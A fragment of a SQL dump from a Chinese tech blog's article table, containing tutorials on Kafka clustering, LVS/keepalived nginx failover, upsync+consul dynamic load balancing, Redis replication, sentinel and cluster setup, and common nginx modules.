检查集群是否成功\n![TIM截图20190608214908.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560006326_TIM截图20190608214908.png)\n![TIM截图20190608215212.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560006326_TIM截图20190608215212.png)\n```c++\n// 1. 一个节点创建订阅主题\n./kafka-topics.sh --create --zookeeper 192.168.147.100:2181 --replication-factor 3 --partitions 1 --topic cluster-topic-test\n\n// 2. 其他节点查看订阅主题,能看到主题信息说明集群成功\n./kafka-topics.sh --describe --zookeeper 192.168.147.100:2181 --topic cluster-topic-test\n```', 0, 0, 49, 0, 0, '2019-06-08 22:45:14', '2019-06-16 13:56:25', 0, 0);
INSERT INTO `article` VALUES (63, 1, 'lvs+keepalive实现nginx双机热备', '2019/6/1560424443_0ae36a8a6d7c2f1348519469d03c8ed3.jpg', '### 目的\n![lvsjiagou.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560425732_lvsjiagou.png)\n#### lvs作用\n1. LVS是Linux Virtual Server的缩写，意思是Linux虚拟服务器。目前有三种IP负载均衡技术（VS/NAT、VS/TUN和VS/DR）；八种调度算法（rr,wrr,lc,wlc,lblc,lblcr,dh,sh）\n2. lvs可以实现传输层负载均衡,负载均衡技术齐全且高效率\n\n#### keepalived作用\n1. keepalived是基于VRRP协议实现的保证集群高可用的一个服务软件，主要功能是实现真机的故障隔离和负载均衡器间的失败切换，防止单点故障\n2. LVS可以实现负载均衡，但是不能够进行健康检查，比如一个rs出现故障，LVS 仍然会把请求转发给故障的rs服务器，这样就会导致请求的无效性\n3. keepalive可以进行健康检查，而且能同时实现 LVS 的高可用性，解决 LVS 单点故障的问题\n\n#### lvs与Nginx区别\n1. LVS基本能支持所有应用，因为工作在第4层，所以LVS可以对几乎所有应用进行负载均衡，包括Web、数据库等\n2. Nginx工作在网路第7层，所以可以对HTTP应用实施分流策略，比如域名、结构等。相比之下，LVS并不具备这样的功能，所以Nginx可使用的场合远多于LVS。并且Nginx对网络的依赖比较小，理论上只要Ping得通，网页访问正常就能连通。LVS比较依赖网络环境。只有使用DR模式且服务器在同一网段内分流，效果才能得到保证\n3. 如果是比较小型的网站（每日PV小于100万），用户Nginx就完全可以应对，如果机器也不少，可以用DNS轮询。\n4. LVS后用的机器较多，在构建大型网站或者提供重要服务且机器较多时，可多加考虑利用LVS。\n\n### 检查LVS\n![TIM截图20190613130733.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560427401_TIM截图20190613130733.png)\n```c++\n// 查看linux内核版本,2.4及以上就自带lvs\nuname -r\n```\n\n### 安装keepalived\n![TIM截图20190613195304.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613195304.png)\n![TIM截图20190613150641.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613150641.png)\n![TIM截图20190613152425.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613152425.png)\n![TIM截图20190613152503.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613152503.png)\n![TIM截图20190613152559.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613152559.png)\n![TIM截图20190613153434.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560426891_TIM截图20190613153434.png)\n```c++\n// 1. 安装依赖\nyum install -y openssl openssl-devel\nyum install popt-devel\nyum install gcc\n\n// 2. 下载并解压keepalived\nwget http://www.keepalived.org/software/keepalived-1.2.18.tar.gz\ntar -zxvf keepalived-1.2.18.tar.gz -C /usr/local/\n\n// 3. 编译并make\ncd /usr/local/keepalived-1.2.18/\n./configure --prefix=/usr/local/keepalived\nmake && make install\n\n// 4. 将keepalived安装成linux系统服务\nmkdir /etc/keepalived\ncp /usr/local/keepalived/etc/keepalived/keepalived.conf /etc/keepalived/\ncp /usr/local/keepalived/etc/rc.d/init.d/keepalived /etc/init.d/\ncp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/\nln -s /usr/local/sbin/keepalived /usr/sbin/\n\n// 这行将会报错,需要解决\nln -s /usr/local/keepalived/sbin/keepalived /sbin/\n// 解决办法\ncd /usr/sbin/ \nrm -f keepalived\ncp /usr/local/keepalived/sbin/keepalived  /usr/sbin/ \n\n// 5. 启动keepalive\nservice keepalived start\n```\n\n### 配置虚拟ip\n#### 编写keepalived的配置文件\n![TIM截图20190613201026.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560427891_TIM截图20190613201026.png)\n```c++\n! Configuration File for keepalived\n\nvrrp_script chk_nginx {\n    script \"/etc/keepalived/nginx_check.sh\" #运行脚本，脚本内容下面有，就是起到一个nginx宕机以后，自动开启服务\n    interval 2 #检测时间间隔\n    weight -20 #如果条件成立的话，则权重 -20\n}\n# 定义虚拟路由，VI_1 为虚拟路由的标示符，自己定义名称\nvrrp_instance VI_1 {\n    ###MASTER 主的意思  BACKUP 从\n    state MASTER #来决定主从\n    interface ens33 # 绑定虚拟 IP 的网络接口，根据自己的机器填写,输入ip addr可查看\n    virtual_router_id 110 # 虚拟路由的 ID 号， 两个节点设置必须一样\n    mcast_src_ip 192.168.147.101 #填写本机ip\n    priority 100 # 节点优先级,主节点要比从节点优先级高\n    nopreempt # 优先级高的设置 nopreempt 解决异常恢复后再次抢占的问题\n    advert_int 1 # 组播信息发送间隔，两个节点设置必须一样，默认 1s\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    # 将 track_script 块加入 instance 配置块\n    track_script {\n        chk_nginx #执行 Nginx 监控的服务\n    }\n    ### 虚拟IP地址配置规范 假设192.168.147.201 \n    virtual_ipaddress {\n        192.168.147.200 # 虚拟ip,也就是解决写死程序的ip怎么能切换的ip,也可扩展，用途广泛。可配置多个。\n    }\n}\n```\n#### 发现宕机自动重启nginx脚本\n```c++\n#!/bin/bash\nA=`ps -C nginx ¨Cno-header |wc -l`\nif [ $A -eq 0 ];then\n    /usr/local/nginx/sbin/nginx\n    sleep 2\n    if [ `ps -C nginx --no-header |wc -l` -eq 0 ];then\n        killall keepalived\n    fi\nfi\n```\n#### 启动keepalived检查虚拟ip是否配置成功\n![TIM截图20190613165441.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560427937_TIM截图20190613165441.png)\n1. 打开nginx,发现既可以使用真实ip,也可以使用虚拟ip进行访问,说明配置成功\n\n\n### 配置Nginx主从热备\n#### 主节点配置\n```c++\n! Configuration File for keepalived\n\nvrrp_script chk_nginx {\n    script \"/etc/keepalived/nginx_check.sh\" #运行脚本，脚本内容下面有，就是起到一个nginx宕机以后，自动开启服务\n    interval 2 #检测时间间隔\n    weight -20 #如果条件成立的话，则权重 -20\n}\n# 定义虚拟路由，VI_1 为虚拟路由的标示符，自己定义名称\nvrrp_instance VI_1 {\n    ###MASTER 主的意思  BACKUP 从\n    state MASTER #来决定主从\n    interface ens33 # 绑定虚拟 IP 的网络接口，根据自己的机器填写,输入ip addr可查看\n    virtual_router_id 110 # 虚拟路由的 ID 号， 两个节点设置必须一样\n    mcast_src_ip 192.168.147.101 #填写本机ip\n    priority 100 # 节点优先级,主节点要比从节点优先级高\n    nopreempt # 优先级高的设置 nopreempt 解决异常恢复后再次抢占的问题\n    advert_int 1 # 组播信息发送间隔，两个节点设置必须一样，默认 1s\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    # 将 track_script 块加入 instance 配置块\n    track_script {\n        chk_nginx #执行 Nginx 监控的服务\n    }\n    ### 虚拟IP地址配置规范 假设192.168.147.201 \n    virtual_ipaddress {\n        192.168.147.200 # 虚拟ip,也就是解决写死程序的ip怎么能切换的ip,也可扩展，用途广泛。可配置多个。\n    }\n}\n```\n#### 从节点配置\n```c++\n ! Configuration File for keepalived\n\nvrrp_script chk_nginx {\n    script \"/etc/keepalived/nginx_check.sh\" #运行脚本，脚本内容下面有，就是起到一个nginx宕机以后，自动开启服务\n    interval 2 #检测时间间隔\n    weight -20 #如果条件成立的话，则权重 -20\n}\n# 定义虚拟路由，VI_1 为虚拟路由的标示符，自己定义名称\nvrrp_instance VI_1 {\n    ###MASTER 主的意思  BACKUP 从\n    state BACKUP #来决定主从\n    interface ens33 # 绑定虚拟 IP 的网络接口，根据自己的机器填写,输入ip addr可查看\n    virtual_router_id 110 # 虚拟路由的 ID 号， 两个节点设置必须一样\n    mcast_src_ip 192.168.147.102 #填写本机ip\n    priority 100 # 节点优先级,主节点要比从节点优先级高\n    nopreempt # 优先级高的设置 nopreempt 解决异常恢复后再次抢占的问题\n    advert_int 1 # 组播信息发送间隔，两个节点设置必须一样，默认 1s\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    # 将 track_script 块加入 instance 配置块\n    track_script {\n        chk_nginx #执行 Nginx 监控的服务\n    }\n    ### 虚拟IP地址配置规范 假设192.168.147.201 \n    virtual_ipaddress {\n        192.168.147.200 # 虚拟ip,也就是解决写死程序的ip怎么能切换的ip,也可扩展，用途广泛。可配置多个。\n    }\n}\n```\n\n#### 验证是否成功\n1. 访问192.168.147.200,lvs将会选择主节点101的nginx\n2. 当主节点的keepalived宕机情况下,lvs将会选择从节点102\n3. 当主节点重启后,lvs将会重新选择至主节点101', 0, 0, 26, 0, 0, '2019-06-13 19:15:07', '2019-06-14 15:07:47', 0, 0);
INSERT INTO `article` VALUES (64, 1, 'upsync+consul实现nginx动态配置负载均衡', '2019/6/1560496896_183E12220D00015175EAF9EC906CC129.jpg', '### 目的\n![nginxconsul.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547035788_nginxconsul.png)\n1. upsync用以实现动态负载均衡,使得实时读取consul中的负载均衡配置\n2. 使得nginx无需更改配置文件后再重启\n3. consul作用为配置中心,与euraka,zookeeper相似,它也可以作用于分布式的服务发现注册中心\n\n### 安装consul\n![TIM截图20190613232200.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190613232200.png)\n![TIM截图20190613232658.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190613232658.png)\n![TIM截图20190613232919.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190613232919.png)\n```c++\n// 1. 下载consul,慢的话手动下载后放入目录\nwget https://releases.hashicorp.com/consul/0.7.5/consul_0.7.5_linux_amd64.zip\n\n// 2. 下载zip解压依赖\nyum -y install unzip\n\n// 3. 解压consul\nunzip consul_0.7.5_linux_amd64.zip\n\n// 4. 关闭防火墙\nsystemctl stop firewalld\n\n// 5. 启动consul\n./consul agent -dev -ui -node=consul-dev -client=192.168.147.101\n\n// 6. 访问检查consul是否启动成功\nhttp://192.168.147.101:8500\n```\n\n### 安装upsync\n![TIM截图20190614130520.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614130520.png)\n![TIM截图20190614130819.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614130819.png)\n![TIM截图20190614133022.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614133022.png)\n![TIM截图20190614133633.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614133633.png)\n![TIM截图20190614134118.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614134118.png)\n```c++\n// 1. 删除原先的已编译并make的nginx,如果之前有的话\nrm -rf /usr/local/nginx\n\n// 2. 下载upsync\nwget https://github.com/weibocom/nginx-upsync-module/archive/master.zip\n\n// 3. 解压upsync\nunzip master.zip \n\n// 4. 创建一些upsync所需要的目录及用户配置信息\ngroupadd nginx\nuseradd -g nginx -s /sbin/nologin nginx\nmkdir -p /var/tmp/nginx/client/\nmkdir -p /usr/local/nginx\n\n// 5. 进入nginx编译解压包\ncd /usr/local/nginx-1.12.0\n\n// 6. 开始编译nginx,注意upsync模块路径是否正确\n./configure   --prefix=/usr/local/nginx   --user=nginx   --group=nginx   --with-http_ssl_module   --with-http_flv_module   --with-http_stub_status_module   --with-http_gzip_static_module   --with-http_realip_module   --http-client-body-temp-path=/var/tmp/nginx/client/   --http-proxy-temp-path=/var/tmp/nginx/proxy/   --http-fastcgi-temp-path=/var/tmp/nginx/fcgi/   --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi   --http-scgi-temp-path=/var/tmp/nginx/scgi   --with-pcre --add-module=../nginx-upsync-module-master\n\n// 7. 编译成功后进行make,编译成功后可以启动nginx检查一下是否正常运行\nmake && make install\n```\n\n### 配置nginx读取consul的配置\n![TIM截图20190614145139.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614145139.png)\n![TIM截图20190614150044.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614150044.png)\n![TIM截图20190614150408.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560497373_TIM截图20190614150408.png)\n```c++\n// 1. 修改nginx.conf配置内容,添加upsync相关内容,具体内容在下面\nvi nginx.conf\n\n// 2. 创建upsync所需持久化存储配置信息的目录\nmkdir /usr/local/nginx/conf/servers/\n\n// 3. 进入sbin目录启动nginx\ncd sbin\n./nginx\n\n// 4. 添加负载均衡信息至consul,使得upsync可读取到\n// consul地址和负载均衡目标服务地址\ncurl -X PUT http://192.168.147.101:8500/v1/kv/upstreams/test/192.168.147.101:8081\ncurl -X PUT http://192.168.147.101:8500/v1/kv/upstreams/test/192.168.147.101:8082\n\n// 5. 关闭防火墙\nsystemctl stop firewalld\n\n// 6. 在8081和8082启动两个应用服务后,访问nginx,查看nginx是否启动成功,upsync是否奏效\nhttp://192.168.147.101\n```\n#### nginx.conf内容\n```c++\n# /usr/local/nginx/conf/nginx.conf\n#user  nobody;\nworker_processes  1;\n\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#pid        logs/nginx.pid;\n\n\nevents {\n    worker_connections  1024;\n}\n\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    #log_format  main  \'$remote_addr - $remote_user [$time_local] \"$request\" \'\n    #                  \'$status $body_bytes_sent \"$http_referer\" \'\n    #                  \'\"$http_user_agent\" \"$http_x_forwarded_for\"\'\n    #          \'$upstream_addr $upstream_status $upstream_response_time $request_time\';\n\n    #access_log  logs/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n\n    #gzip  on;\n    #\n    #vhost_traffic_status_zone;\n    #proxy_cache_path /tmp/cache_backend keys_zone=cache_backend:10m;\n\n    upstream test {\n    	## upsync所需的监听\n        server 127.0.0.1:11111; \n        ## 连接consulServer,获取动态的配置信息\n        upsync 192.168.147.101:8500/v1/kv/upstreams/test upsync_timeout=6m upsync_interval=500ms upsync_type=consul strong_dependency=off;\n        ### 动态拉取consulServer相关负载均衡信息持久化在硬盘上,需要创建\n        upsync_dump_path /usr/local/nginx/conf/servers/servers_test.conf;\n    }\n\n    server {\n        listen 80;\n        server_name localhost;\n\n        location / {\n            proxy_pass http://test;\n            index index.html index.htm;\n        }\n\n    }\n}\n\n\n```', 0, 0, 23, 0, 0, '2019-06-14 15:21:44', '2019-06-14 15:54:12', 0, 0);
INSERT INTO `article` VALUES (65, 1, 'redis主从复制配置与持久化方式', '2019/6/1560576444_00937A2ECCCFC8BC1CA8401E55DB0DB3.jpg', '### 目的\n![mastersalve.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560577674_mastersalve.png)\n1. 注意在该主从复制下,只能有一个主(Master),可以有多个从(Slave),Redis是单线程的\n2. 主服务器可以读写操作,从服务器只有读操作\n3. 该主从复制,读写分离方式是Redis集群方式中的一种\n4. redis的主从复制只需要从服务进行配置即可\n\n### 从服务器配置主从复制\n![TIM截图20190614220147.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560577674_TIM截图20190614220147.png)\n![TIM截图20190614220055.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560577674_TIM截图20190614220055.png)\n```c++\n// 1. 修改102从服务的redis.conf配置文件\nvi redis.conf\n// 修改内容\n// 配置指向主服务redis信息\nslaveof 192.168.147.101 6379\n// 配置指定主服务redis的密码\nmasterauth \"1234\"\n```\n\n### 检查主从复制是否配置成功\n![TIM截图20190614222043.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560577674_TIM截图20190614222043.png)\n```c++\n// 1. 关闭原先的redis,有的话\n./redis-cli -h 127.0.0.1 -p 6379 -a \"1234\" shutdown\n\n// 2. 关闭防火墙\nsystemctl stop firewalld\n\n// 3. 启动redis\n./redis-server /usr/local/redis/etc/redis.conf\n\n// 4. 连接redis进行测试\n./redis-cli -h 127.0.0.1 -p 6379 -a \"1234\"\n// 在主服务上进行set操作,查看从服务是否能获取到主服务的值,如果能获取到,说明主从服务配置成功\n// 在redisclient中输入info,可以查看到主从服务的配置信息\ninfo\n```\n### RDB与AOF持久化\n#### RDB持久化\n![TIM截图20190614234147.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560580358_TIM截图20190614234147.png)\n1. 以二进制文件形式,满足以某个时间点进行存储\n2. 开启单独的进程去进行记录操作,与当前redis主线程没有任何关联\n3. 非实时的记录,当服务器整个停电宕机时,会丢失数据\n4. 默认开启RDB,且redis关闭停止会进行最后记录\n\n#### AOF持久化\n![TIM截图20190614233757.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560580358_TIM截图20190614233757.png)\n1. 实时日志记录形式只记录写的操作\n2. 效率不是很高,会影响到整体性能\n3. 实时的记录,数据较为安全\n4. 需修改redis.conf开启,将appendonly改为yes', 0, 0, 32, 0, 0, '2019-06-15 13:27:29', '2019-06-16 13:21:21', 0, 0);
INSERT INTO `article` VALUES (66, 1, 'redis哨兵机制配置', '2019/6/1560581371_279CB52F417AA985F703BE162F3F10B5.jpg', '### 目的\n![monitor.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_monitor.png)\n1. 哨兵(sentinel) 是一个分布式系统,你可以在一个架构中运行多个哨兵(sentinel) 进程,这些进程使用流言协议(gossipprotocols)来接收关于Master是否下线的信息,并使用投票协议(agreement protocols)来决定是否执行自动故障迁移,以及选择哪个Slave作为新的Master\n2. 每个哨兵(sentinel) 会向其它哨兵(sentinel)、master、slave定时发送消息,以确认对方是否”活”着,如果发现对方在指定时间(可配置)内未回应,则暂时认为对方已挂(所谓的”主观认为宕机” Subjective Down,简称sdown)\n3. 若“哨兵群”中的多数sentinel,都报告某一master没响应,系统才认为该master\"彻底死亡\"(即:客观上的真正down机,Objective Down,简称odown),通过一定的vote算法,从剩下的slave节点中,选一台提升为master,然后自动修改相关配置.\n4. 虽然哨兵(sentinel) 释出为一个单独的可执行文件 redis-sentinel ,但实际上它只是一个运行在特殊模式下的 Redis 服务器，你可以在启动一个普通 Redis 服务器时通过给定 --sentinel 选项来启动哨兵(sentinel)\n\n#### Redis的哨兵系统用于管理多个Redis服务器,该系统执行以下三个任务:\n1. 监控(Monitoring): 哨兵(sentinel) 会不断地检查你的Master和Slave是否运作正常\n2. 提醒(Notification):当被监控的某个 Redis出现问题时, 哨兵(sentinel) 可以通过 API 向管理员或者其他应用程序发送通知\n3. 自动故障迁移(Automatic failover):当一个Master不能正常工作时，哨兵(sentinel) 会开始一次自动故障迁移操作,它会将失效Master的其中一个Slave升级为新的Master, 并让失效Master的其他Slave改为复制新的Master; 当客户端试图连接失效的Master时,集群也会向客户端返回新Master的地址,使得集群可以使用Master代替失效Master\n\n### 确认主从复制配置完毕\n![TIM截图20190615121627.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615121627.png)\n\n### 哨兵服务配置\n#### 修改sentinel.conf文件\n![TIM截图20190615123436.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615123436.png)\n![TIM截图20190615123753.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615123753.png)\n```c++\n// 1. 进入redis源码目录\ncd redis-3.2.9\n\n// 2. 将sentinel.conf文件复制至编译make后的配置目录\ncp sentinel.conf  /usr/local/redis/etc\n\n// 3. 进行配置目录\ncd /usr/local/redis/etc/\n\n// 4. 修改sentinel.conf\nvi sentinel.conf\n// 修改内容\n// 配置主服务的信息,选举投票次数\nsentinel monitor mymaster 192.168.147.103 6379 1\n// 配置主服务的连接密码\nsentinel auth-pass mymaster 1234\n// 宕机读取状态间隔时间\nsentinel down-after-milliseconds mymaster 30\n```\n\n\n#### 启动哨兵,并检查主从服务状态\n![TIM截图20190615124637.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615124637.png)\n![TIM截图20190615124910.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615124910.png)\n```c++\n// 1. 主从服务全都进行重启\n./redis-cli -h 127.0.0.1 -p 6379 -a \"1234\" shutdown\n./redis-server /usr/local/redis/etc/redis.conf\n\n// 2. 主从服务和哨兵服务全都关闭防火墙\nsystemctl stop firewalld\n\n// 3. 哨兵服务启动哨兵\n./redis-server /usr/local/redis/etc/sentinel.conf --sentinel &\n\n// 4. 各服务连接服务\n./redis-cli -h 127.0.0.1 -p 6379 -a \"1234\"\n\n// 5. redis终端下执行info,查看信息\ninfo\n```\n\n### 原主服务宕机问题\n![TIM截图20190615125541.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615125541.png)\n![TIM截图20190615130230.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615130230.png)\n![TIM截图20190615130440.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615130440.png)\n![TIM截图20190615130615.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615130615.png)\n```c++\n// 由于原主服务无需配置主从复制的主服务地址\n// 但是哨兵机制下,原主服务宕机重启后变为从服务\n// 原主服务变为从服务后,需要配置主从复制,否则数据无法同步\n// 1. 修改redis.conf\nvi /usr/local/redis/etc/redis.conf\n// 修改内容\n// 配置主服务的连接密码,建议参与集群的redis服务节点密码都设置为一样\nmasterauth \"1234\"\n```', 0, 0, 32, 0, 0, '2019-06-15 14:50:06', '2019-06-15 15:26:20', 0, 0);
INSERT INTO `article` VALUES (67, 1, 'redisCluster集群搭建', '2019/6/1560662567_CE03500D5E4A6209801E618D412C38DE5746405.jpg', '### 依赖及示范代码\n链接：https://pan.baidu.com/s/1YLGSf7GjivJFLGpybeqVbg \n提取码：4ldg\n\n### 目的\n![cluster.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_cluster.png)\n1. 该种基于分片分摊的集群方式是推荐的redis集群方案\n2. 它不像主从复制集群那样造成数据冗余\n3. 该种集群方案是redis3后官方推荐的方式,参与集群节点数量最少为6\n\n### 安装集群(每个节点都要进行如下配置)\n#### 安装依赖\n![TIM截图20190615181133.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615181133.png)\n```c++\n// 1. 安装依赖\nyum install ruby\nyum install rubygems\n\n// 2. 安装redis的gem\n// 资源地址: \ngem install -l redis-3.2.1.gem\n```\n\n#### 创建集群相关目录\n![TIM截图20190615182605.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615182605.png)\n```c++\n// 1. 创建cluster文件夹,便于与单机版隔离\nmkdir /usr/local/redis-cluster\n\n// 2. 创建相关目录\ncd /usr/local/redis-cluster/\nmkdir -p 6379/data\nmkdir bin\n\n// 3. 将源码目录的执行脚本进行拷贝\ncd ~/redis-3.2.9/src/\ncp mkreleasehdr.sh redis-benchmark redis-check-aof  redis-cli redis-server redis-trib.rb /usr/local/redis-cluster/bin\n```\n![TIM截图20190615182834.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615182834.png)\n![TIM截图20190615183020.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615183020.png)\n![TIM截图20190615183429.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615183429.png)\n![TIM截图20190615183714.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615183714.png)\n![TIM截图20190615183811.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615183811.png)\n![TIM截图20190615183949.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615183949.png)\n```c++\n// 1. 拷贝一份单机版至集群版目录\ncp -r /usr/local/redis    /usr/local/redis-cluster/6379/\n\n// 2. 进入etc目录修改redis.conf,若没有则从源码目录里拷贝到这里\ncd /usr/local/redis-cluster/6379/redis/etc/\nvi redis.conf\n// 修改内容\n// 后台运行\ndaemonize yes\n// 端口号\nport 6379\n// 添加当前节点服务的服务地址,不同服务地址的节点不能填写错误\nbind 192.168.147.101\n// 开启集群\ncluster-enabled yes\n// 该节点的集群配置文件,注意数字必须是与port端口一致\ncluster-config-file nodes-6379.conf\n// 集群重试的超时时间\ncluster-node-timeout 15000\n// 开启AOF持久化,redisCluster集群依赖于此\nappendonly yes\n// 进程文件,注意数字必须是与port端口一致\npidfile /var/run/redis_6379.pid\n// 文件尾部添加该行,路径为自创建的节点data目录,shift+g可移动到文件尾部\ndir /usr/local/redis-cluster/6379/data/\n```\n\n### 启动集群\n![TIM截图20190615230419.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615230419.png)\n![TIM截图20190615231443.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662694_TIM截图20190615231443.png)\n![TIM截图20190615231154.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615231154.png)\n![TIM截图20190615231222.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662694_TIM截图20190615231222.png)\n```c++\n// 1. 各节点关闭服务\n./redis-cli -h 192.168.147.101 -p 6379 shutdown \n\n// 2. 各节点关闭防火墙\nsystemctl stop firewalld\n\n// 3. 各节点启动redis服务\n./redis-server /usr/local/redis-cluster/6379/redis/etc/redis.conf\n\n// 4. 任一节点开启集群,列出所有参与集群的节点服务信息\n/usr/local/redis-cluster/bin/redis-trib.rb create --replicas 1 192.168.147.101:6379 192.168.147.102:6379 192.168.147.103:6379 192.168.147.104:6379 192.168.147.105:6379 192.168.147.106:6379\n\n// 5. 各节点连接redis查看集群状态\n./redis-cli -c -h 192.168.147.101 -p 6379\n```\n\n### 检查集群是否成功\n![TIM截图20190615232711.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662694_TIM截图20190615232711.png)\n```c++\n// 在节点中进行写操作,查看分片是否会被执行,节点是否会自动切换\n```', 0, 0, 35, 0, 0, '2019-06-16 13:22:55', '2019-06-16 14:09:06', 0, 0);
INSERT INTO `article` VALUES (68, 1, 'nginx常用模块及配置', '2019/6/1560774008_628483C7990EF172E4CB678A1E8C8474.jpg', '### nginxy优势\n1. IO多路复用epoll\n2. 轻量级,功能模块少,代码模块化\n3. CPU亲和,把CPU核心和Nginx工作进程绑定方式,把每个worker进程固定在一个CPU上执行,减少切换cpu的cachemiss,获取更好的性能\n4. 采用sendfile,基于Linux零拷贝传输模式\n\n### 常见模块\n#### 连接频率限制,limit_conn_module\n```c++\n// key可以是Ip或其他,会话限制针对于某ip\nSyntax: limit_conn_zone #{key} zone=#{name}:#{size}\nDefault: -\nContext: http\n\nSyntax: limit_conn #{name} #{number}	限制并发的数量\nDefault: -\nContext: http,server,location \n```\n```c++\n// http请求建立在一次tcp连接基础上,一次tcp请求至少产生一次。\n// http请求配置限制存储记录的大小与key\nhttp {\n	// 限制某ip的连接次数\n    limit_conn_zone $binary_remote_addr zone=conn_zone:1m;\n    server {\n    	location / {\n			root /opt/app/code;\n			// 某ip单次只允许一个连接\n			limit_conn conn_zone 1;\n			index  index.html index.htm;\n		} \n    }\n}\n```\n\n#### 请求频率限制,limit_req_module\n```c++\n// 配置限制存储记录的大小,key与速率\nSyntax: limit_req_zone #{key} zone=#{name}:#{size} rate=rate\nDefault: -\nContext: http\n\n// 制并发的数量\nSyntax: limit_req zone=#{name} burst=#{number} nodelay\nDefault: -\nContext: http,server,location\n```\n```c++\nhttp {\n	// 限制某ip的请求速率与限制存储记录的大小\n	limit_req_zone $binary_remote_addr zone=req_zone:1m rate=1r/s;\n	server {\n		location / {\n			root /opt/app/code;\n			// 达到请求频率时对3个请求进行延迟3秒响应,其他请求进行503\n			limit_req zone=req_zone burst=3 nodelay;\n			limit_req zone=req_zone burst=3;\n			limit_req zone=req_zone;\n			index  index.html index.htm;	\n		}\n	}	\n}\n```\n\n#### 基于ip的访问控制,http_access_module \n```c++\n// 配置允许访问的ip控制\nSyntax: allow #{address} | CIDR | unix | all;\nDefault: -	\nContext: http,server,location,limit_except\n\n// 配置不允许访问的ip控制\nSyntax: deny #{address} | CIDR | UNIX | all\nDefault: -\nContext: http,server,location,limit_except\n```\n```c++\nserver {\n	// 除了222.128.189.17,其他所有ip都允许访问\n	location ~ ^/admin.html {\n		 root   /opt/app/code;\n		 // 禁止该ip访问\n		 deny 222.128.189.17;\n		 // 允许所有ip访问\n		 allow all;\n		 index  index.html index.htm;\n	}\n	// 只允许222.128.189.0-24访问\n	location ~ ^/admin.html {\n		root   /opt/app/code;\n		// 只允许该ip访问,0-24网段\n		allow 222.128.189.0/24;	\n		// 禁止所有ip访问\n		deny all;\n		index  index.html index.htm;\n	}\n}\n```\n\n#### 随机选择一个页面,http_random_index_module\n```c++\n// 配置是否开启随机主页\nSyntax: random_index on | off\nDefault: random_index off\nContext: location\n```\n```c++\nserver {\n	location / {\n		root   /opt/app/code;\n		// 开启随机主页\n		random_index on;\n	}\n}\n```\n#### 